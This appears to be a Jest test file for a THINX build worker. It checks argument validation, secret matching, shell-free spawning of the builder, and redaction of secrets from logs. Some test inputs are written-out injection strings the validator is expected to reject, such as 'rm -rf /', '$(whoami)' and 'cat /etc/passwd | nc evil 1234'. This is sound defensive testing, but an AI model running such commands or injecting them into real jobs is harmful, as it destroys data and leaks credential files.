// Test needs server socket (API) to be mocked

const { createServer } = require("http");
const { Server } = require("socket.io");
const EventEmitter = require("events");
const child_process = require("child_process");
const util = require("util");

const Worker = require('./class.js');

let server_port = 4000;

let io, w;

describe("Worker", () => {

    let that = this;
    
    let build_id = "abcd1234-12434asdfaa";
    let owner = "mock-owner";
    let udid = "udid";
    let path = "path";

    let CMD = "echo hello";
    let BUILD_PATH = "/tmp/test-build/";

    let job = {
        mock: false,
        build_id: build_id,
        owner: owner,
        udid: udid,
        path: BUILD_PATH,
        cmd: CMD,
        secret: process.env.WORKER_SECRET || null
    };

    // Mock API-side handler stub: the real API parses the worker's register
    // message here; for the mock we only need it to not throw.
    function parseSocketMessage(_socket, _msg) { /* no-op mock */ }

    beforeAll((done) => {
        that.workers = {};
        const httpServer = createServer();
        io = new Server(httpServer);
        // Must listen on server_port (4000) so the worker, which connects to
        // http://localhost:4000, actually reaches this mock server and populates
        // that.serverSocket via the connection handler below.
        httpServer.listen(server_port, () => {
            //const port = httpServer.address().port;
        });
        io.on("connection", (socket) => {

            that.serverSocket = socket;
            
            socket.on('connect', () => {
                console.log(`ℹ️ [info] Worker connected: ${socket.id}`);
                that.workers[socket.id].connected = true;
            });
    
            socket.on('disconnect', () => {
                console.log(`ℹ️ [info] Unregistering disconnected worker ${socket.id}.`);
                if (typeof (socket.id) !== "undefined") {
                    delete that.workers[socket.id];
                } else {
                    console.log("Socket ID undefined on disconnect.");
                }
            });
    
            // either by directly modifying the `auth` attribute
            socket.on("connect_error", () => {
                if ((typeof (process.env.WORKER_SECRET) !== "undefined")) {
                    socket.auth.token = process.env.WORKER_SECRET;
                    console.log("connect_error attempt to resolve using WORKER_SECRET");
                    socket.connect();
                }
                console.log("onerror workers", that.workers);
            });
    
            // Business Logic events
    
            socket.on('register', (msg) => {
                if (typeof (that.workers[socket.id]) === "undefined") {
                    that.workers[socket.id] = {
                        connected: true,
                        socket: socket,
                        running: false
                    };
                }
                parseSocketMessage(socket, msg);
    
                console.log("ℹ️ [info] Currently registered workers", Object.keys(that.workers));
            });
    
            socket.on('poll', (msg) => {
                console.log("ℹ️ [info] Worker is polling, should call runNext job with this socket ID at least once...", msg);
            });
    
            socket.on('job-status', (_job_status) => {
                if ((typeof (this.workers[socket.id]) !== "undefined") && (this.workers[socket.id] !== null)) {
                    this.workers[socket.id].running = false;
                    console.log(`Setting worker ${this.workers[socket.id]} to not running.`);
                }
            });

        });
        done();
    });

    afterAll(() => {
        // Close the worker's live client socket so it stops reconnecting and does not
        // leak an open handle (otherwise `jest --detectOpenHandles` hangs at exit).
        if (typeof (w) !== "undefined" && w && w.socket) w.socket.close();
        if (typeof (io) !== "undefined") io.close();
    });

    test('mandatory configuration must be set', () => {
        let THINX_SERVER = `http://localhost:${server_port}`; // this is API's websocket port authenticated using WORKER_SECRET
        w = new Worker(THINX_SERVER);
    });

    test('emit', () => {
        io.emit("client id", "1");
    });

    test('job (valid)', () => {
        io.emit("job", job);
    });

    test('job (no-job)', () => {
        io.emit("job", null);
    });

    test('job (undef-job)', () => {
        io.emit("job", undefined);
    });

    test('job (cmd-with-;)', () => {
        io.emit("job", {
            cmd: ";"
        });
    });

    test('job (cmd-with-&)', () => {
        io.emit("job", {
            cmd: "&"
        });
    });

    test('job (cmd-with-ls)', () => {
        io.emit("job", {
            cmd: "ls -la"
        });
    });

    test('job (cmd-with-null-id)', () => {
        io.emit("job", {
            build_id: null
        });
    });

    test('job (cmd-with-mock-id)', () => {
        io.emit("job", {
            build_id: "mock",
            cmd: "ls -la"
        });
    });

    test('job (cmd-with-mock-udid)', () => {
        io.emit("job", {
            build_id: "mock",
            cmd: "ls -la",
            udid: "mock"
        });
    });

    test('failJob', () => {
        let details = "details";
        w.failJob(io, job, details);
    });

    test('validateJob', () => {
        w.validateJob(io, job);
    });

    test('isBuildIDValid', () => {
        let valid = w.isBuildIDValid(build_id);
        expect(valid).toBe(true);
    });

    test('isArgumentSafe', () => {
        let safe = w.isArgumentSafe(CMD);
        expect(safe).toBe(true);
    });

    test('isArgumentSafe accepts legitimate build arguments', () => {
        expect(w.isArgumentSafe("--git=https://github.com/owner/repo.git")).toBe(true);
        expect(w.isArgumentSafe("--branch=main")).toBe(true);
        expect(w.isArgumentSafe("./builder --owner=mock --build_id=abc-123")).toBe(true);
    });

    test('isArgumentSafe rejects shell metacharacters', () => {
        expect(w.isArgumentSafe("echo hello; rm -rf /")).toBe(false);
        expect(w.isArgumentSafe("echo hello && whoami")).toBe(false);
        expect(w.isArgumentSafe("echo `whoami`")).toBe(false);
        expect(w.isArgumentSafe("echo $(whoami)")).toBe(false);
        expect(w.isArgumentSafe("cat /etc/passwd | nc evil 1234")).toBe(false);
        expect(w.isArgumentSafe("echo hi > /tmp/x")).toBe(false);
        expect(w.isArgumentSafe(undefined)).toBe(false);
    });

    test('secretsMatch is exact and rejects prefixes', () => {
        expect(w.secretsMatch("s3cr3t", "s3cr3t")).toBe(true);
        expect(w.secretsMatch("s3cr3t-extra", "s3cr3t")).toBe(false); // prefix must NOT pass
        expect(w.secretsMatch("s3cr3", "s3cr3t")).toBe(false);
        expect(w.secretsMatch("wrong", "s3cr3t")).toBe(false);
        expect(w.secretsMatch(null, "s3cr3t")).toBe(false);
    });

    test('runShell releases running guard on invalid build_id (no deadlock)', () => {
        w.running = true;
        w.runShell("echo hello", owner, "invalid id!", udid, path, io);
        expect(w.running).toBe(false);
    });

    test('runShell releases running guard on unsafe --git argument (no deadlock)', () => {
        w.running = true;
        w.runShell("--git=http://x;rm -rf /", owner, build_id, udid, path, io);
        expect(w.running).toBe(false);
    });

    test ('runShell', (done) => {
        w.runShell(CMD, owner, build_id, udid, path, io, () => {
            done();
        });
    });

    // SEC-EXEC-02 (D-02, D-04): a job carrying `argv` must reach the builder
    // program without a shell, and the program is always the worker's own
    // constant, never something named by the job. child_process.spawn is
    // spied on the shared module object, which class.js calls through.
    describe('argv jobs (SEC-EXEC-02)', () => {

        const BUILDER = "/opt/thinx/thinx-device-api/builder";
        const SPEC_SECRET = "spec-secret";
        const ARGV_OWNER = "0123456789abcdef".repeat(4);
        const ARGV_UDID = "a80cc610-4faf-11e7-9a9c-41d4f7ab4083";
        const ARGV_BUILD_ID = "abcd-1234";

        let spawnSpy, savedSecret, fakeSock;

        const validArgv = () => [
            "--owner=" + ARGV_OWNER,
            "--udid=" + ARGV_UDID,
            "--git=https://github.com/o/r.git",
            "--branch=main",
            "--id=" + ARGV_BUILD_ID,
            "--workdir=/mnt/data/repos/x",
            "--dry-run"
        ];

        const argvJob = (argv, extra) => Object.assign({
            build_id: ARGV_BUILD_ID,
            owner: ARGV_OWNER,
            udid: ARGV_UDID,
            path: BUILD_PATH,
            secret: SPEC_SECRET,
            argv: argv
        }, extra || {});

        // A child that never emits: the handlers attach, nothing runs.
        const fakeChild = () => {
            const child = new EventEmitter();
            child.stdout = new EventEmitter();
            child.stderr = new EventEmitter();
            return child;
        };

        // True when any argument of any spawn call asks for a shell.
        const anyShellSpawn = () => spawnSpy.mock.calls.some((call) =>
            call.some((arg) => arg !== null && typeof arg === "object" && !Array.isArray(arg) && arg.shell === true));

        beforeEach(() => {
            savedSecret = process.env.WORKER_SECRET;
            process.env.WORKER_SECRET = SPEC_SECRET;
            spawnSpy = jest.spyOn(child_process, "spawn").mockImplementation(() => fakeChild());
            fakeSock = { emit: jest.fn() };
            w.running = false;
        });

        afterEach(() => {
            spawnSpy.mockRestore();
            if (typeof savedSecret === "undefined") {
                delete process.env.WORKER_SECRET;
            } else {
                process.env.WORKER_SECRET = savedSecret;
            }
            w.running = false;
        });

        test('(a) argv job spawns the constant builder program with shell:false', () => {
            const argv = validArgv();
            w.runJob(fakeSock, argvJob(argv));
            expect(spawnSpy).toHaveBeenCalledTimes(1);
            expect(spawnSpy).toHaveBeenCalledWith(BUILDER, argv, { shell: false });
            expect(anyShellSpawn()).toBe(false);
        });

        test('(b) a job with both argv and cmd runs argv only; cmd is ignored', () => {
            const argv = validArgv();
            w.runJob(fakeSock, argvJob(argv, { cmd: "echo SHOULD-NOT-RUN" }));
            expect(spawnSpy).toHaveBeenCalledTimes(1);
            expect(spawnSpy).toHaveBeenCalledWith(BUILDER, argv, { shell: false });
            expect(anyShellSpawn()).toBe(false);
            expect(spawnSpy.mock.calls.flat()).not.toContain("echo SHOULD-NOT-RUN");
        });

        test.each([
            ["an empty array", []],
            ["a non-array argv", "--owner=x"],
            ["a non-string element", [42]],
            ["a program named by the job", ["/bin/sh", "-c", "id"]],
            ["a shell metacharacter in --git", ["--git=http://x;rm -rf /"]],
            ["an unknown flag", ["--unknown=1"]],
            ["command substitution in --env", ["--env={\"a\":\"$(id)\"}"]]
        ])('(c) argv with %s is refused with "Invalid argv" and nothing is spawned', (_label, argv) => {
            w.runJob(fakeSock, argvJob(argv));
            expect(spawnSpy).not.toHaveBeenCalled();
            expect(fakeSock.emit).toHaveBeenCalledWith("job-status",
                expect.objectContaining({ status: "Failed", details: "Invalid argv" }));
            expect(w.running).toBe(false);
        });

        test('argv job still needs a matching job secret', () => {
            w.runJob(fakeSock, argvJob(validArgv(), { secret: "wrong-secret" }));
            expect(spawnSpy).not.toHaveBeenCalled();
            expect(fakeSock.emit).toHaveBeenCalledWith("job-status",
                expect.objectContaining({ details: "Invalid job authentication" }));
        });

        test('argv job still needs a build_id', () => {
            w.runJob(fakeSock, argvJob(validArgv(), { build_id: undefined }));
            expect(spawnSpy).not.toHaveBeenCalled();
            expect(fakeSock.emit).toHaveBeenCalledWith("job-status",
                expect.objectContaining({ details: "Missing build_id" }));
        });

        test('argv job is refused when WORKER_SECRET is not configured (fail closed)', () => {
            delete process.env.WORKER_SECRET;
            w.runJob(fakeSock, argvJob(validArgv()));
            expect(spawnSpy).not.toHaveBeenCalled();
        });

        test('(d) runArgv releases the running guard on an invalid build_id and spawns nothing', () => {
            expect(typeof w.runArgv).toBe("function");
            w.running = true;
            w.runArgv(validArgv(), ARGV_OWNER, "invalid id!", ARGV_UDID, BUILD_PATH, fakeSock);
            expect(w.running).toBe(false);
            expect(spawnSpy).not.toHaveBeenCalled();
        });

        test('runArgv re-validates argv before spawning (defence in depth)', () => {
            expect(typeof w.runArgv).toBe("function");
            w.running = true;
            w.runArgv(["/bin/sh", "-c", "id"], ARGV_OWNER, ARGV_BUILD_ID, ARGV_UDID, BUILD_PATH, fakeSock);
            expect(w.running).toBe(false);
            expect(spawnSpy).not.toHaveBeenCalled();
        });

        // D-03: a cmd-only job still runs (old API images), and says so once in
        // the log. When worker logs stop showing this line, cmd can be dropped.
        // The log-hygiene cases below keep the job secret and the custom env
        // JSON out of the worker log (T-23-13).

        const logLinesOf = (logSpy) => logSpy.mock.calls.map((call) => util.format(...call));

        const waitFor = (predicate, timeoutMs) => new Promise((resolve, reject) => {
            let waited = 0;
            const tick = setInterval(() => {
                if (predicate()) { clearInterval(tick); resolve(); }
                else if ((waited += 25) >= timeoutMs) { clearInterval(tick); reject(new Error("condition not met in time")); }
            }, 25);
        });

        test('legacy cmd-only job logs one warning with its build_id and still runs through the shell path', () => {
            const logSpy = jest.spyOn(console, "log");
            try {
                w.runJob(fakeSock, { cmd: "echo hello", build_id: ARGV_BUILD_ID, udid: "u", secret: SPEC_SECRET });
                const warnings = logLinesOf(logSpy).filter((line) => line.includes("legacy cmd-only job"));
                expect(warnings.length).toBe(1);
                expect(warnings[0]).toContain(ARGV_BUILD_ID);
                expect(warnings[0]).not.toContain(SPEC_SECRET);
                expect(warnings[0]).not.toContain("echo hello");
                expect(spawnSpy).toHaveBeenCalledTimes(1);
                expect(spawnSpy).toHaveBeenCalledWith("echo hello", { shell: true });
            } finally {
                logSpy.mockRestore();
            }
        });

        test('argv job logs no legacy warning', () => {
            const logSpy = jest.spyOn(console, "log");
            try {
                w.runJob(fakeSock, argvJob(validArgv()));
                expect(spawnSpy).toHaveBeenCalledTimes(1);
                expect(logLinesOf(logSpy).some((line) => line.includes("legacy cmd-only job"))).toBe(false);
            } finally {
                logSpy.mockRestore();
            }
        });

        test('runArgv logs the argv without the --env payload', () => {
            const argv = validArgv().concat(["--env={\"WIFI_PASS\":\"hunter2\"}"]);
            const logSpy = jest.spyOn(console, "log");
            try {
                w.runJob(fakeSock, argvJob(argv));
                expect(spawnSpy).toHaveBeenCalledWith(BUILDER, argv, { shell: false });
                const lines = logLinesOf(logSpy);
                expect(lines.some((line) => line.includes("hunter2"))).toBe(false);
                expect(lines.some((line) => line.includes("worker runArgv") && line.includes("--env=<redacted>"))).toBe(true);
            } finally {
                logSpy.mockRestore();
            }
        });

        test('legacy cmd-only job logs its command without the --env payload', () => {
            const cmd = "./builder --owner=" + ARGV_OWNER + " --id=" + ARGV_BUILD_ID + " '--env={\"WIFI_PASS\":\"hunter2\"}'";
            const logSpy = jest.spyOn(console, "log");
            try {
                w.runJob(fakeSock, { cmd: cmd, build_id: ARGV_BUILD_ID, udid: "u", secret: SPEC_SECRET });
                expect(spawnSpy).toHaveBeenCalledTimes(1);
                const lines = logLinesOf(logSpy);
                expect(lines.some((line) => line.includes("hunter2"))).toBe(false);
                expect(lines.some((line) => line.includes("worker runShell command") && line.includes("--env=<redacted>"))).toBe(true);
            } finally {
                logSpy.mockRestore();
            }
        });

        test('the socket job handler never logs the --env payload from argv or cmd', async () => {
            await waitFor(() => w.socket.connected && typeof that.serverSocket === "object", 8000);
            const logSpy = jest.spyOn(console, "log");
            try {
                const env = "--env={\"WIFI_PASS\":\"hunter2\"}";
                io.emit("job", {
                    mock: true,
                    build_id: ARGV_BUILD_ID,
                    udid: ARGV_UDID,
                    argv: validArgv().concat([env]),
                    cmd: "./builder --id=" + ARGV_BUILD_ID + " '" + env + "'",
                    secret: "wrong-secret"
                });
                await waitFor(() => logLinesOf(logSpy).some((line) => line.includes("Worker has new job")), 3000);
                const lines = logLinesOf(logSpy);
                expect(lines.some((line) => line.includes("hunter2"))).toBe(false);
                expect(lines.some((line) => line.includes("Worker has new job") && line.includes("--env=<redacted>"))).toBe(true);
                expect(spawnSpy).not.toHaveBeenCalled(); // wrong secret: refused
            } finally {
                logSpy.mockRestore();
            }
        }, 15000);

        test('the socket job handler never logs the job secret', async () => {
            // The worker connects asynchronously; the earlier io.emit cases are
            // fire-and-forget, so wait for a live connection before emitting.
            await waitFor(() => w.socket.connected && typeof that.serverSocket === "object", 8000);
            const logSpy = jest.spyOn(console, "log");
            try {
                io.emit("job", { mock: true, build_id: ARGV_BUILD_ID, udid: ARGV_UDID, argv: validArgv(), secret: "leak-me-please" });
                await waitFor(() => logLinesOf(logSpy).some((line) => line.includes("Worker has new job")), 3000);
                expect(logLinesOf(logSpy).some((line) => line.includes("leak-me-please"))).toBe(false);
                expect(spawnSpy).not.toHaveBeenCalled(); // wrong secret: refused
            } finally {
                logSpy.mockRestore();
            }
        }, 15000);

        // Review iteration 2, WR-01: failJob used to echo the whole job back as
        // job-status, and the API logs every job-status it receives. The echo
        // must carry identifying fields only: never the job secret, the argv
        // (--env JSON) or the legacy cmd.

        const FAIL_KEYS = ["build_id", "details", "owner", "status", "udid"];
        const ENV_ARG = "--env={\"WIFI_PASS\":\"hunter2\"}";

        test('failJob echoes only build_id, udid, owner, status and details', () => {
            w.running = true;
            w.failJob(fakeSock, argvJob(validArgv().concat([ENV_ARG]), {
                secret: "leak-me-please",
                cmd: "./builder '" + ENV_ARG + "'",
                source_id: "sid",
                mock: false
            }), "Invalid job authentication");
            expect(fakeSock.emit).toHaveBeenCalledTimes(1);
            const [event, payload] = fakeSock.emit.mock.calls[0];
            expect(event).toBe("job-status");
            expect(Object.keys(payload).sort()).toEqual(FAIL_KEYS);
            expect(payload).toEqual({
                build_id: ARGV_BUILD_ID,
                udid: ARGV_UDID,
                owner: ARGV_OWNER,
                status: "Failed",
                details: "Invalid job authentication"
            });
            expect(w.running).toBe(false);
        });

        test('failJob tolerates a job that is not an object', () => {
            w.failJob(fakeSock, null, "Missing command");
            expect(fakeSock.emit).toHaveBeenCalledWith("job-status",
                expect.objectContaining({ status: "Failed", details: "Missing command" }));
        });

        const statusFromServer = (timeoutMs) => new Promise((resolve, reject) => {
            const timer = setTimeout(() => reject(new Error("no job-status reached the server")), timeoutMs);
            that.serverSocket.once("job-status", (payload) => { clearTimeout(timer); resolve(payload); });
        });

        test.each([
            ["a wrong job secret", { secret: "wrong-secret" }, validArgv(), "Invalid job authentication"],
            ["an invalid argv", { secret: SPEC_SECRET }, validArgv().concat(["--unknown=1"]), "Invalid argv"]
        ])('the job-status the API receives for %s carries no secret, argv, cmd or --env payload', async (_label, extra, argv, details) => {
            await waitFor(() => w.socket.connected && typeof that.serverSocket === "object", 8000);
            const received = statusFromServer(3000);
            io.emit("job", Object.assign({
                mock: true,
                build_id: ARGV_BUILD_ID,
                udid: ARGV_UDID,
                owner: ARGV_OWNER,
                path: BUILD_PATH,
                argv: argv.concat([ENV_ARG]),
                cmd: "./builder --id=" + ARGV_BUILD_ID + " '" + ENV_ARG + "'"
            }, extra));
            const payload = await received;
            expect(payload.details).toBe(details);
            expect(Object.keys(payload).sort()).toEqual(FAIL_KEYS);
            const wire = JSON.stringify(payload);
            expect(wire).not.toContain("hunter2");
            expect(wire).not.toContain("--env");
            expect(wire).not.toContain(extra.secret);
            expect(spawnSpy).not.toHaveBeenCalled();
        }, 15000);
    });

    test('socket must be closed/disconnected at the end', async () => {
        // The worker connects asynchronously; wait until the connection handler has
        // stored the server-side socket in that.serverSocket (up to ~2s).
        await new Promise((resolve, reject) => {
            let waited = 0;
            const tick = setInterval(() => {
                if (that.serverSocket) { clearInterval(tick); resolve(); }
                else if ((waited += 25) >= 2000) { clearInterval(tick); reject(new Error("worker never connected to mock server")); }
            }, 25);
        });
        expect(typeof that.serverSocket).toBe("object");
        // A server-side socket.io Socket has no close(); disconnect(true) tears down
        // the socket and its underlying connection.
        that.serverSocket.disconnect(true);
    });

});

